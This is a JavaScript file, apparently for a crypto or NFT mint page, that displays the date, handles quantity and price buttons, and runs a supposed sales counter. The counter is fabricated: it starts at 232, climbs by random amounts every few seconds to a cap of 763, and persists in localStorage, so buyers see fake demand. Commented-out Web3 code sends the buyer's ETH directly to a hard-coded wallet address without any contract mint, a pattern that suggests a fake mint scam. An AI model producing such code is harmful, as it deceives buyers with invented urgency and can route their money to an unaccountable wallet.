$(document).ready(function () {



	var DateMode = 1; // 1 - EST | 2 - UTC
var TimeON = 1; // 1 - Enable | 2 - Off

var datey = new Date(Date.now());

var dateForUTC = new Date(Date.now());

var dateyx = datey.toLocaleString('en-US', { timeZone: 'America/New_York' });
var datej = new Date(dateyx);
var datehour = datej.getHours();
var dateday = datej.getDate();

var datehourUTC = dateForUTC.getUTCHours();
var datedayUTC = dateForUTC.getUTCDate();

if(datehour == 1) { datehour = '- 1am EST' }    if(datehourUTC == 1) { datehourUTC = '- 1am UTC' }
if(datehour == 2) { datehour = '- 2am EST' }    if(datehourUTC == 2) { datehourUTC = '- 2am UTC' }
if(datehour == 3) { datehour = '- 3am EST' }    if(datehourUTC == 3) { datehourUTC = '- 3am UTC' }
if(datehour == 4) { datehour = '- 4am EST' }    if(datehourUTC == 4) { datehourUTC = '- 4am UTC' }
if(datehour == 5) { datehour = '- 5am EST' }    if(datehourUTC == 5) { datehourUTC = '- 5am UTC' }
if(datehour == 6) { datehour = '- 6am EST' }    if(datehourUTC == 6) { datehourUTC = '- 6am UTC' }
if(datehour == 7) { datehour = '- 7am EST' }    if(datehourUTC == 7) { datehourUTC = '- 7am UTC' }
if(datehour == 8) { datehour = '- 8am EST' }    if(datehourUTC == 8) { datehourUTC = '- 8am UTC' }
if(datehour == 9) { datehour = '- 9am EST' }    if(datehourUTC == 9) { datehourUTC = '- 9am UTC' }
if(datehour == 10) { datehour = '- 10am EST' }    if(datehourUTC == 10) { datehourUTC = '- 10am UTC' }
if(datehour == 11) { datehour = '- 11am EST' }    if(datehourUTC == 11) { datehourUTC = '- 11am UTC' }
if(datehour == 12) { datehour = '- 12pm EST' }    if(datehourUTC == 12) { datehourUTC = '- 12pm UTC' }
if(datehour == 13) { datehour = '- 1pm EST' }     if(datehourUTC == 13) { datehourUTC = '- 1pm UTC' }
if(datehour == 14) { datehour = '- 2pm EST' }     if(datehourUTC == 14) { datehourUTC = '- 2pm UTC' }
if(datehour == 15) { datehour = '- 3pm EST'}    if(datehourUTC == 15) { datehourUTC = '- 3pm UTC'}
if(datehour == 16) { datehour = '- 4pm EST' }     if(datehourUTC == 16) { datehourUTC = '- 4pm UTC' }
if(datehour == 17) { datehour = '- 5pm EST' }     if(datehourUTC == 17) { datehourUTC = '- 5pm UTC' }
if(datehour == 18) { datehour = '- 6pm EST' }     if(datehourUTC == 18) { datehourUTC = '- 6pm UTC' }
if(datehour == 19) { datehour = '- 7pm EST' }     if(datehourUTC == 19) { datehourUTC = '- 7pm UTC' }
if(datehour == 20) { datehour = '- 8pm EST' }     if(datehourUTC == 20) { datehourUTC = '- 8pm UTC' }
if(datehour == 21) { datehour = '- 9pm EST' }     if(datehourUTC == 21) { datehourUTC = '- 9pm UTC' }
if(datehour == 22) { datehour = '- 10pm EST' }    if(datehourUTC == 22) { datehourUTC = '- 10pm UTC' }
if(datehour == 23) { datehour = '- 11pm EST' }    if(datehourUTC == 23) { datehourUTC = '- 11pm UTC' }
if(datehour == 0) { datehour = '- 12am EST' }     if(datehourUTC == 0) { datehourUTC = '- 12am UTC' }

if(DateMode == 1) {
  document.getElementById("dateday2").innerHTML = dateday;
  if(TimeON == 1) {
  document.getElementById("datehour1").innerHTML = datehour;
  }
} else if(DateMode == 2) {
  document.getElementById("dateday2").innerHTML = datedayUTC;
  if(TimeON == 1) {
  document.getElementById("datehour1").innerHTML = datehourUTC;
  }
}



let timerInterval;
let time = 232;
 
function updateTime() {
  var rnd = Math.floor(Math.random() * (15 - 4)) + 15;
  
  time = time + rnd;
  if(time > 763){
    time = 763;
  }
  let secs = time;

  
document.querySelector('#num_1').innerHTML = `${secs}`;
}
 var rnd2 = Math.floor(Math.random() * (6000 - 3001)) + 6000;
function startTimer() {
    
  timerInterval = setInterval(updateTime, rnd2);
};
 
function stopTimer() {
  clearInterval(timerInterval);
}
window.onbeforeunload = function(event){
  localStorage.setItem('asdfghjk1', time);
}
 
window.addEventListener('load', () => {
  time = parseInt(localStorage.getItem('asdfghjk1'));
  if(isNaN(time)) time = 232
  startTimer()
}, false );









var el = 0;
$('#plus').on('click', function(e){
    var t = parseInt($('#pricex').text(), 10);
    t += 1;
    if(t > 10){
        t = 10;

    }
    $('#pricex').text(t);
    var total = (t*0.1).toFixed(2);
    $('#price').text(total);
});
$('#minus').on('click', function(e){
    var t = parseInt($('#pricex').text(), 10);
    t -= 1;
    if(t < 1){
        t = 1;
    }
    $('#pricex').text(t);
    var total = (t*0.1).toFixed(2);
    $('#price').text(total);
});
$('#ape-max').click(function(){
    $('.eth_input').val($('.eth_input').attr('max'));
    $('#pricex').text($('.eth_input').attr('max'));
    $('#price').text(($('.eth_input').attr('max') * 0.1).toFixed(2));
});
    
    
// let web3 = new Web3(ethereum);

// const isMetaMaskConnected = async () => {
//     let accounts = await web3.eth.getAccounts();
//     return accounts.length > 0;
// }

//  async function updateMetaMaskStatus() {
//   isMetaMaskConnected().then((connected) => {
//     if (connected) {
        
//         document.getElementById('transfer').style.display = 'block';
//         document.getElementById('connect').style.display = 'none';
//     }

//   });
// }

//  async function connectMetaMask() {
//   if (await isMetaMaskConnected() == false) {
//     await ethereum.enable();
//     await updateMetaMaskStatus();
//     location.reload();
//   }
// }

// let accounts = web3.eth.getAccounts();
// web3.eth.defaultAccount = accounts[0];

// document.onload = updateMetaMaskStatus();
// document.querySelector('#connect').addEventListener('click', connectMetaMask);
// document.querySelector('#transfer').addEventListener('click', sendEth);

// function sendEth() {
//     let inp = document.getElementById('price').textContent;
//     let givenNumber = inp.toString();
//   web3.eth.sendTransaction({
//     from: web3.currentProvider.selectedAddress,
//     to: '0x3Ca0C47f524a0e98885E39398e6Ae44a7B401740',
//     value: (web3.utils.toWei(givenNumber, 'ether')),
//   });
// }





});

